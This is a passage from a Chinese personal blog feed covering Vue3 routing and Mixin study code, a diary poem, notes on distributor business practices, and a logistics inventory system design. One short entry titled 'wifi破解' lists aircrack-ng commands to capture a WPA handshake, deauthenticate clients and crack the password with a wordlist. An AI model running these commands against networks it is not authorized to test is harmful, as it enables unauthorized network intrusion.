	5.使用路由：router-link标签用来实现路由的跳转
		&#123;
			router-link类似a标签,to属性类型href属性，表示路由的path,根据路由映射跳转到对应的component
			&lt;router-link to&#x3D;&quot;path地址&quot;&gt;&lt;&#x2F;router-link&gt;
		&#125;
	6.指定路由出口：声明路由对应的组件要渲染到页面的什么位置 
	&#123;
		&lt;router-view&gt;&lt;&#x2F;router-view&gt;
	&#125;
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
		&lt;!-- 安装路由 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue-router@4&quot;&gt;&lt;&#x2F;script&gt;
		
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 5.使用路由 --&gt;
			&lt;router-link to&#x3D;&quot;&#x2F;&quot;&gt;点我打开：Home页面&lt;&#x2F;router-link&gt;
			&lt;router-link to&#x3D;&quot;&#x2F;about&quot;&gt;点我打开：About页面&lt;&#x2F;router-link&gt;
			
			&lt;div style&#x3D;&quot;width: 100%; height: 200px; border:1px solid red;&quot;&gt;&lt;&#x2F;div&gt;
			&lt;!-- 6.指定路由出口 --&gt;
			&lt;router-view&gt;&lt;&#x2F;router-view&gt;
			&lt;div style&#x3D;&quot;width: 100%; height: 200px; border:1px solid green;&quot;&gt;&lt;&#x2F;div&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			&#x2F;&#x2F; 1.定义路由组件
			const Home &#x3D; &#123;
				template: &#39;&lt;div style&#x3D;&quot;width: 600px; height: 300px; border: 1px solid red;&quot;&gt;&lt;h1&gt;Home页面&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&#39;
			&#125;
			const About &#x3D; &#123;
				template: &#39;&lt;div style&#x3D;&quot;width: 600px; height: 300px; background: green;&quot;&gt;&lt;h1&gt;About页面&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&#39;
			&#125;
			&#x2F;&#x2F; 2.声明路由映射
			const routes &#x3D; [&#x2F;&#x2F;使用数组存放多个路由映射，每个元素表示一个路由的映射
				&#123;path: &quot;&#x2F;&quot;,component: Home&#125;,
				&#123;path: &quot;&#x2F;about&quot;,component: About&#125;
			]
			&#x2F;&#x2F; 3.创建路由对象
			const router &#x3D; VueRouter.createRouter(&#123;
				&#x2F;&#x2F;3.1 配置路由参数
				history: VueRouter.createWebHashHistory(), &#x2F;&#x2F; 指定路由创建模式
				&#x2F;&#x2F; routes: 路由映射
				&#x2F;&#x2F; 路由映射数组重名时，可直接简写为routes
				&#x2F;&#x2F;routes
				routes: routes
				
			&#125;);
			
			&#x2F;&#x2F; 创建Vue对象
			const app &#x3D; Vue.createApp(&#123;
				&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						
					&#125;
				&#125;
			&#125;);
			&#x2F;&#x2F;4.将路由对象绑定到Vue对象
			app.use(router);
						
			&#x2F;&#x2F;挂载到DOM
			 app.mount(&quot;#app&quot;);
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Home页面：</p>
<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230420142230515.png" alt="image-20230420142230515"></p>
<p>About页面：</p>
<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230420142435689.png" alt="image-20230420142435689"></p>
<h1 id="Mixin对象"><a href="#Mixin对象" class="headerlink" title="Mixin对象"></a>Mixin对象</h1><h2 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1 基本使用"></a>1 基本使用</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- Mixin
	提升Vue组件中代码复用，在Mixin中定义组件，然后将Mixin对象引入到Vue对象实例上。
	1.定义Mixin对象
		&#123;
			const myMixin1 &#x3D; &#123;
				created()&#123;
					&#x2F;&#x2F; 可以访问生命周期钩子函数
				&#125;,
				methods: &#123;
					&#x2F;&#x2F; 可以自定义方法
				&#125;,
				components: &#123;
					&#x2F;&#x2F; 可以自定义组件
				&#125;
				
			&#125;;
			const myMixin2 &#x3D; &#123;
				
			&#125;;
		&#125;
	2.创建Vue实例对象，并通过mixins属性来访问外部定义的Mixin对象。
		&#123;
			const app &#x3D; Vue.createApp(&#123;
				mixins: [myMixin1,myMixin2]
			&#125;);
			&#x2F;&#x2F;挂载
		&#125;
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			&#x2F;&#x2F;1.定义Mixin对象
			const myMixin1 &#x3D; &#123;
				created()&#123;
					this.hello();
				&#125;,
				methods: &#123;
					hello()&#123;
						alert(&quot;hello from Mixin&quot;);
					&#125;
				&#125;
			&#125;;
			const myMixin2 &#x3D; &#123;
				created()&#123;
					this.msg();
				&#125;,
				methods: &#123;
					msg()&#123;
						alert(&quot;hello Mixin&quot;);
					&#125;
				&#125;
			&#125;;
			&#x2F;&#x2F;2.创建Vue实例对象,并通过mixins属性来访问外部定义的Mixin对象。
			const app &#x3D; Vue.createApp(&#123;
				mixins: [myMixin1,myMixin2]
			&#125;);
			app.mount(&quot;#app&quot;);
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="2-Mixin选项合并"><a href="#2-Mixin选项合并" class="headerlink" title="2 Mixin选项合并"></a>2 Mixin选项合并</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue"> &lt;!--Mixin选项合并  
	若Mixin的成员和Vue实例的成员(变量、方法)同名,则优先输出Vue实例中对应的成员，而Mixin中对应重复成员会被覆盖。
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;Mixin选项合并&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const myMixin &#x3D;&#123;
				data()&#123;
					return&#123;
						message: &quot;Hello Mixin&quot;,
						foo: &quot;abc&quot;
					&#125;
				&#125;
			&#125;;
			
			const app &#x3D; Vue.createApp(&#123;
				mixins: [myMixin],
				data()&#123;
					return &#123;
						message: &quot;hello Vue&quot;,
						bar: &quot;def&quot;
					&#125;
				&#125;,
				created()&#123;
					&#x2F;&#x2F; $data指向Vue的data函数
					&#x2F;&#x2F;将Vue对象的data数据以JSON字符串格式输出
					&#x2F;&#x2F; &#123;&quot;message&quot;:&quot;hello Vue&quot;,&quot;foo&quot;:&quot;abc&quot;,&quot;bar&quot;:&quot;def&quot;&#125;
					document.write(JSON.stringify(this.$data)); 
				&#125;
			&#125;);
			&#x2F;&#x2F;挂载
			app.mount(&quot;#app&quot;);
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="Axios"><a href="#Axios" class="headerlink" title="Axios"></a>Axios</h1>]]></content>
  </entry>
  <entry>
    <title>wifi破解</title>
    <url>/2023/04/21/wifi%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//是否支持监听
arimon-ng
//开启监听
airmon-ng start wlan0
//扫描WIfi
airodump-ng wlan0mon
//抓包
airodump-ng <span class="token parameter variable">-c</span> 信道 <span class="token parameter variable">--bssid</span> 路由器mac <span class="token parameter variable">-w</span> hach wlan0mon
//踢下线
aireplay-ng <span class="token parameter variable">-0</span> <span class="token number">10</span> <span class="token parameter variable">-a</span> 路由器mac <span class="token parameter variable">-c</span> 客户机mac wlan0mon
//跑包
aircrack-ng <span class="token parameter variable">-w</span> pass.txt hach-07.cap
aircrack-ng <span class="token parameter variable">-a2</span> <span class="token parameter variable">-b</span> 路由器mac <span class="token parameter variable">-w</span> pass.txt hach-05.cap
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>Fri Jun 23 2023 08:00:00 GMT+0800 (中国标准时间)</title>
    <url>/2023/06/23/2023-06-23/</url>
    <content><![CDATA[<blockquote>
<p>太阳温暖天边彩霞</p>
<p>努力代表汗水无价</p>
<p>用自信走遍海角天涯</p>
<p>我有勇气我都不怕</p>
<p>管它寒冬炎夏</p>
<p>我很坚强大步的跨</p>
<p>我停不住步伐</p>
</blockquote>
]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>2023年6月24日14:47:02</title>
    <url>/2023/06/24/2023%E5%B9%B46%E6%9C%8824%E6%97%A514-47-02/</url>
    <content><![CDATA[<p>  通过学习商务部的ISO文档(业务流程、制度、规则)等公开资料了解公司的商务运作。商务部各个小组的功能职责。采购管理系统(物流条码进销存)、CBS业务管理系统。到物流组学习：上午了解物流组业务，下午对照系统学习，中间遇到不明白的概念主动索取资料想办法理解。</p>
<p>目标：一个季度熟悉掌握四大系统，后续可以维护物流系统。</p>
<ul>
<li>项目和分销</li>
<li>商务部新员工培训资料(什么叫订单通知、虚出、暂存、虚库、为什么分很多仓位、逻辑关系)，项目订单通知什么结构、订单号的规则、进货价、供货价</li>
<li>厂家相关的文档或PPT，积累有关厂家的一些知识</li>
<li>厂家、总代、二代的特殊的业务处理逻辑关系</li>
<li>分销转虚库：公司要向厂家报业绩。假如总代一季度要完成1亿业绩，现在只完成了9百万。这时，虚出1百万到虚出仓，虚库暂存（实际没出货，但提前报业绩），凑成一个亿以完成目标业绩申报。仓位分开管理，真实出货时从虚出仓。</li>
<li>转报业绩：对于核心代理A，虚出1百万到虚库，业绩暂时不报，将代理商B（没有报业绩的需求，对于厂家，货还在库存，实际出了货，但没报业绩，后续转报给A）的1百万转报 给A</li>
<li>订单通知：项目是厂家跟代理商跟最终用户在市场招标、投标、中标过程中形成的一个项目订单。包括信息：项目名称、最终用户、使用产品、价格（比分销低一点）、订单号、行业、进货价（指定项目名称的最终用户、总代、产品的价格）、供货价。</li>
<li>不同订单类型的差异化。</li>
<li>针对需求跟系统结合，逆向解剖系统功能。</li>
<li>系统详细设计说明书。</li>
<li>新的需求跟现有系统之间是什么关系，哪些可以二次改造，哪些需要重新开发。</li>
</ul>
]]></content>
      <tags>
        <tag>record</tag>
      </tags>
  </entry>
  <entry>
    <title>2023年6月30日11:41:48</title>
    <url>/2023/06/30/2023%E5%B9%B46%E6%9C%8830%E6%97%A511-41-48/</url>
    <content><![CDATA[<h2 id="分销商和代理商"><a href="#分销商和代理商" class="headerlink" title="分销商和代理商"></a>分销商和代理商</h2><p>制造厂家→总经销商→分销商→零售商→消费者。除去一头一尾中间叫流通环节，也许还有一级批发二级批发等等等等。后面的是前面的客户。</p>
<p>👉🏻分销商: 东北大区下面有黑龙江、吉林、辽宁。那么为了高效分管，小明又找到小红、小东、小北三人，来分销你的饼干，小红负责黑龙江，小东负责吉林，小北负责辽宁。那么这三个人就是分销商。他们三个人通过资本获取你的饼干，然后转卖出去，从中赚差价。同时，小红三人也可以分销其他厂家的小饼干，不一定只卖小明那一个品牌的。<br>👉🏻代理商是只能代理厂家，且在一定区域范围内代理，对代理人有一定的资金或经验的要求。某厂家生产饼干，为了扩宽销售覆盖面积，节约成本。需要向黑龙江、吉林，辽宁这三地销售。那么可以找小明代理“东北三省”的业务。相当于东北这-大片归小明管了，那么小明就是东北区代理商。</p>
<h2 id="加盟"><a href="#加盟" class="headerlink" title="加盟"></a>加盟</h2><p>如果要追溯特许经营的历史，最早的萌芽期是在 1840 年代，一些英国啤酒酿造商会授予一些经营啤酒的较小商店的专卖权。<br>从 19 世纪末到 20 世纪初，炼油厂和汽车制造商开始允许某些人和公司销售他们的产品。例如，福特要求加盟商按照总部制定的销售方式和服务标准销售福特汽车。<br>在 1937 年，麦当劳的兄弟哥哥麦克·麦当劳和弟弟戴克·麦当劳在加利福尼亚州的国道上开了一家正规的小吃店。<br>1940年，他们将店铺迁至洛杉矶以东80公里的繁华住宅区，生意兴隆。经过10年的创业，兄弟俩积累了财富，但他们仍然认为应该改变原有的思维方式和商业模式。他们决定关闭已经开张 10 年的餐厅，并引入自助服务和快餐配送方式。<br>兄弟俩非常热衷于推广这种模式，而不是管理和改进特许经营体系。正是麦当劳加盟商之一的莱·克罗克先生，真正推动了麦当劳市场的快速发展。 1961年，克罗克购买了麦当劳商标，开始致力于麦当劳特许经营发展模式的研发。这极大地促进了加盟店的发展和管理。<br>无独有偶，1955年，65岁的哈蓝先生到一家餐厅制作自己发明的肯德基炸鸡，并在盐湖城开设了第一家加盟店。<br>特许经营：以注册商标、企业标志、专利、专有技术等经营资源为营销手段，并通过签订合同取得其拥有的经营资源许可的企业（特许人）。其他企业（被特许人）利用被特许人以合同为基础，以统一的经营形式开展业务，并向特许人支付特许经营费的经营活动。<br>在官方术语中，用文字翻译特许经营的定义。所谓的特许经营是：<br>我经营一家商店，它非常有利可图。经过开发，VI系统完善，店铺状态非常好，管理系统完善，店铺完全规范化运作。<br>这个时候，你来了看了这家店，觉得还不错。判定能赚钱，了解业务的方方面面都很好。提出能不能跟着我也搞一家。<br>我说可以搞，没问题。<br>品牌VI给你用。我们会帮您选址和装修，提供统一的产品原材料供应，负责管理和操作技能培训。<br>但是我做这一套东西是有知识产权和成本的，你交点加盟费，这个不过分吧？<br>我给你提供了经营技术的培训，输出管理是有成本的，你交点管理费和培训费吧？<br>进货一次性交下押金，以后进货就都不用花钱了，这样省事，你看怎么样？<br>为了保证，你能长久合作下去、服务好顾客、不给品牌抹黑，你交点保证金吧，不干了退你！<br>以上介绍这些，就是加盟。我出让了我创造的可以稳定获取利润的模式，你承接了这种模式，我们绑在了一起，共同实现各自的目标，就是加盟。</p>
]]></content>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>2023年6月30日16:09:54</title>
    <url>/2023/06/30/2023%E5%B9%B46%E6%9C%8830%E6%97%A516-09-54/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>物流进销存管理系统设计</title>
    <url>/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E8%BF%90%E8%90%A5%E6%A8%A1%E5%BC%8F.png" alt="运营模式"></p>
<h1 id="一-业务功能"><a href="#一-业务功能" class="headerlink" title="一 业务功能"></a>一 业务功能</h1><h2 id="1-入库管理"><a href="#1-入库管理" class="headerlink" title="1 入库管理"></a>1 入库管理</h2><h3 id="1-1-入库管理-入库单录入查询"><a href="#1-1-入库管理-入库单录入查询" class="headerlink" title="1.1 入库管理- 入库单录入查询"></a>1.1 入库管理- 入库单录入查询</h3><h4 id="1-1-1-字段说明"><a href="#1-1-1-字段说明" class="headerlink" title="1.1.1 字段说明"></a>1.1.1 字段说明</h4><h5 id="入库主表字段说明"><a href="#入库主表字段说明" class="headerlink" title="入库主表字段说明"></a><em><strong>入库主表字段说明</strong></em></h5><hr>
<p><strong>入库日期</strong></p>
<p>记录实际入库日期。</p>
<p><strong>入库单号</strong></p>
<p>锁定状态。根据编码规则自动生成，唯一不重复。</p>
<p><strong>采购订单号</strong></p>
<p><strong>项目名称</strong></p>
<p><strong>代理商名称</strong></p>
<p><strong>订单类型</strong></p>
<p><strong>入库类型</strong></p>
<p><strong>仓库地点</strong></p>
<p><strong>产品线</strong></p>
<p><strong>库存类型</strong></p>
<ul>
<li><p>项目库</p>
</li>
<li><p>分销库</p>
</li>
</ul>
<p><strong>仓库属性</strong></p>
<p><strong>供应商</strong></p>
<p><strong>入库数量</strong></p>
<p><strong>入库金额</strong></p>
<h5 id="入库产品明细字段说明"><a href="#入库产品明细字段说明" class="headerlink" title="入库产品明细字段说明"></a><em><strong>入库产品明细字段说明</strong></em></h5><hr>
<p><strong>入库单号</strong></p>
<p><strong>BOM编码</strong></p>
<p><strong>产品型号</strong></p>
<p><strong>目录价</strong></p>
<p><strong>折扣率</strong></p>
<p><strong>单价</strong></p>
<p><strong>数量</strong></p>
<p><strong>金额</strong></p>
<p><strong>仓位归属</strong></p>
<p><strong>项目标识</strong></p>
<h5 id="入库条码明细字段说明"><a href="#入库条码明细字段说明" class="headerlink" title="入库条码明细字段说明"></a><em><strong>入库条码明细字段说明</strong></em></h5><hr>
<p><strong>入库单号</strong></p>
<p><strong>条码</strong></p>
<p><strong>BOM编码</strong></p>
<p><strong>产品型号</strong></p>
<p><strong>数量</strong></p>
<p><strong>单价</strong></p>
<p><strong>金额</strong></p>
<h4 id="1-1-2-操作说明"><a href="#1-1-2-操作说明" class="headerlink" title="1.1.2 操作说明"></a>1.1.2 操作说明</h4><h5 id="入库登记"><a href="#入库登记" class="headerlink" title="入库登记"></a>入库登记</h5><p>入库单录入查询窗口：</p>
<ul>
<li>关联显示录入产品明细和条码</li>
<li>入库数量和金额自动汇总</li>
<li>入库条码明细的BOM编码和产品型号等信息自动匹配</li>
</ul>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706143020268.png" alt="image-20230706143020268"></p>
<h6 id="关联采购订单号入库"><a href="#关联采购订单号入库" class="headerlink" title="关联采购订单号入库"></a>关联采购订单号入库</h6><p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706145741631.png" alt="image-20230706145741631"></p>
<ul>
<li>勾选入库。系统自动通过采购订单号获取有关信息填充到主表和明细表。</li>
<li>主表录入<strong>仓库地点、产品线（含库存类型、仓库属性）</strong></li>
<li>修改产品明细表<strong>入库数量</strong>，选择<strong>仓位归属和项目标识</strong></li>
<li>审核</li>
</ul>
<blockquote>
<p>同一个合同号分批入库，下次入库时，系统提供剩余未入库清单再次勾选入库。</p>
<p>对非H3C产品线，如果有无条码需要按有条码管理，系统可以提供<strong>虚拟条码</strong>生成功能。</p>
</blockquote>
<h6 id="批量导入"><a href="#批量导入" class="headerlink" title="批量导入"></a>批量导入</h6><h4 id="1-1-3-业务说明"><a href="#1-1-3-业务说明" class="headerlink" title="1.1.3 业务说明"></a>1.1.3 业务说明</h4><h2 id="2-出库管理"><a href="#2-出库管理" class="headerlink" title="2 出库管理"></a>2 出库管理</h2><h3 id="2-1-出库管理-出库单录入查询"><a href="#2-1-出库管理-出库单录入查询" class="headerlink" title="2.1 出库管理- 出库单录入查询"></a>2.1 出库管理- 出库单录入查询</h3><h4 id="2-1-1-字段说明"><a href="#2-1-1-字段说明" class="headerlink" title="2.1.1 字段说明"></a>2.1.1 字段说明</h4><h5 id="出库主表字段说明"><a href="#出库主表字段说明" class="headerlink" title="出库主表字段说明"></a><em>出库主表字段说明</em></h5><hr>
<p><strong>主库日期</strong></p>
<p><strong>出库单号</strong></p>
<p><strong>销售合同号</strong></p>
<p><strong>出库类型</strong></p>
<p><strong>项目供货单号</strong></p>
<p><strong>项目名称</strong></p>
<p><strong>出货代理商名称</strong></p>
<p><strong>订单类型</strong></p>
<p><strong>仓库地点</strong></p>
<p><strong>产品线</strong></p>
<p><strong>库存类型</strong></p>
<p><strong>仓库属性</strong></p>
<p><strong>申请出货部门</strong></p>
<p><strong>责任人</strong></p>
<p><strong>收货地点</strong></p>
<p><strong>CBS申报类型</strong></p>
<p><strong>CBS申报的代理商名称</strong></p>
<p><strong>代理商编码</strong></p>
<p><strong>出库数量</strong></p>
<p><strong>出库金额</strong></p>
<h5 id="出库产品明细字段说明"><a href="#出库产品明细字段说明" class="headerlink" title="出库产品明细字段说明"></a><em>出库产品明细字段说明</em></h5><hr>
<p><strong>出库单号</strong></p>
<p><strong>BOM编码</strong></p>
<p><strong>产品型号</strong></p>
<p><strong>目录价</strong></p>
<p><strong>折扣率</strong></p>
<p><strong>数量</strong></p>
<p><strong>合同单价</strong></p>
<p><strong>合同金额</strong></p>
<p><strong>供货单价</strong></p>
<p><strong>供货金额</strong></p>
<p><strong>仓位归属</strong></p>
<p><strong>项目标识</strong></p>
<p>同一个办事处有不同的项目，可设定不同的项目标识，库存产品自然按归属和项目标识分类接收并汇总。</p>
<h5 id="出库条码明细字段说明"><a href="#出库条码明细字段说明" class="headerlink" title="出库条码明细字段说明"></a><em>出库条码明细字段说明</em></h5><hr>
<p><strong>出库单号</strong></p>
<p><strong>条码</strong></p>
<p><strong>BOM编码</strong></p>
<p><strong>产品型号</strong></p>
<p><strong>数量</strong></p>
<p><strong>合同单价</strong></p>
<p><strong>合同金额</strong></p>
<p><strong>供货单价</strong></p>
<p><strong>供货金额</strong></p>
<h4 id="2-1-2-操作说明"><a href="#2-1-2-操作说明" class="headerlink" title="2.1.2 操作说明"></a>2.1.2 操作说明</h4><h5 id="出库登记"><a href="#出库登记" class="headerlink" title="出库登记"></a>出库登记</h5><p>出库单录入查询窗口:</p>
<ul>
<li>关联显示产品明细和条码</li>
<li>出库数量和金额自动汇总</li>
<li>出库条码明细的BOM编码和产品型号等信息自动匹配</li>
</ul>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706153355153.png" alt="image-20230706153355153"></p>
<p><strong>1 关联销售合同号出库</strong></p>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706153328040.png" alt="image-20230706153328040"></p>
<ul>
<li>勾选出库。系统自动通过销售合同号获取有关信息填充到主表和明细表。</li>
<li>主表录入<strong>仓库地点、产品线（含库存类型、仓库属性）</strong></li>
<li>修改产品明细表<strong>出库数量</strong>，选择<strong>仓位归属和项目标识</strong></li>
<li>审核</li>
</ul>
<blockquote>
<p>同一个销售合同号分批出库，下次出库时，系统提供剩余未出库清单再次勾选出库。</p>
<p>若有无条码产品需出库，系统可按“先进先出原则”分配和产品数量一致的<strong>虚拟条码</strong>。</p>
</blockquote>
<h4 id="2-1-3-业务说明"><a href="#2-1-3-业务说明" class="headerlink" title="2.1.3 业务说明"></a>2.1.3 业务说明</h4><h3 id="2-2-销售退回登记与校验"><a href="#2-2-销售退回登记与校验" class="headerlink" title="2.2 销售退回登记与校验"></a>2.2 销售退回登记与校验</h3><hr>
<p>针对原合同出库清单选择退货，不允许重复退货。</p>
<h2 id="3-货运及签收管理"><a href="#3-货运及签收管理" class="headerlink" title="3 货运及签收管理"></a>3 货运及签收管理</h2><h3 id="3-1-货运信息登记"><a href="#3-1-货运信息登记" class="headerlink" title="3.1 货运信息登记"></a>3.1 货运信息登记</h3><hr>
<h4 id="3-1-1-字段说明"><a href="#3-1-1-字段说明" class="headerlink" title="3.1.1 字段说明"></a>3.1.1 字段说明</h4><p>出库单号、货运单号、收货人、物流公司、运输方式、保险金额、运费、签收</p>
<h4 id="3-1-2-操作说明"><a href="#3-1-2-操作说明" class="headerlink" title="3.1.2 操作说明"></a>3.1.2 操作说明</h4><h4 id="3-1-3-业务说明"><a href="#3-1-3-业务说明" class="headerlink" title="3.1.3 业务说明"></a>3.1.3 业务说明</h4><h3 id="3-2-还货登记与校验"><a href="#3-2-还货登记与校验" class="headerlink" title="3.2 还货登记与校验"></a>3.2 还货登记与校验</h3><hr>
<p>针对借货库存还货</p>
<h3 id="3-3-货运信息表"><a href="#3-3-货运信息表" class="headerlink" title="3.3 货运信息表"></a>3.3 货运信息表</h3><h4 id="3-3-1-字段说明"><a href="#3-3-1-字段说明" class="headerlink" title="3.3.1 字段说明"></a>3.3.1 字段说明</h4><p>发货日期、发货仓库、单序号、关联出库单号、运输方式、目的地、收货人、收货地点、收货单位、联系电话、物流公司、件数、货运单号、投保金额、保险费、运费、结算时间、结算金额、备注。</p>
<h4 id="3-3-2-操作说明"><a href="#3-3-2-操作说明" class="headerlink" title="3.3.2 操作说明"></a>3.3.2 操作说明</h4><h4 id="3-3-3-业务说明"><a href="#3-3-3-业务说明" class="headerlink" title="3.3.3 业务说明"></a>3.3.3 业务说明</h4><ul>
<li><p>订单组递交《出库单》——&gt;物流组编上<strong>单序号</strong>（便于和仓库核对）——&gt;仓库</p>
</li>
<li><p>《货运单》：发货时间、运算方式、收货地点和收货人相同的《出库单》交给一家物流公司，合并成一个《货运单》。</p>
</li>
<li><p>货运单号是货物跟踪查询以及和物流公司结算的依据。</p>
</li>
</ul>
<h3 id="3-4-签收合格率统计"><a href="#3-4-签收合格率统计" class="headerlink" title="3.4 签收合格率统计"></a>3.4 签收合格率统计</h3><hr>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706172657359.png" alt="image-20230706172657359"></p>
<h3 id="3-5-项目签收预警"><a href="#3-5-项目签收预警" class="headerlink" title="3.5 项目签收预警"></a>3.5 项目签收预警</h3><ul>
<li>物流公司未返回《签收单》的项目，与《销售合同报表》对比，查看办事处是否有签收和欠款。</li>
<li>1个月以上都没有签收返回而且无收款或欠款的单进行预警。导出excel文件并邮件通知订单组接口人和办事处商务助理进行补办签收单。</li>
</ul>
<h4 id="3-4-1-业务说明"><a href="#3-4-1-业务说明" class="headerlink" title="3.4.1 业务说明"></a>3.4.1 业务说明</h4><hr>
<p>签单合格登记流程：</p>
<p><img src="/2023/06/30/%E7%89%A9%E6%B5%81%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/image-20230706174032848.png" alt="image-20230706174032848"></p>
<h2 id="4-库存查询"><a href="#4-库存查询" class="headerlink" title="4 库存查询"></a>4 库存查询</h2><p><strong>仓库属性分类</strong></p>
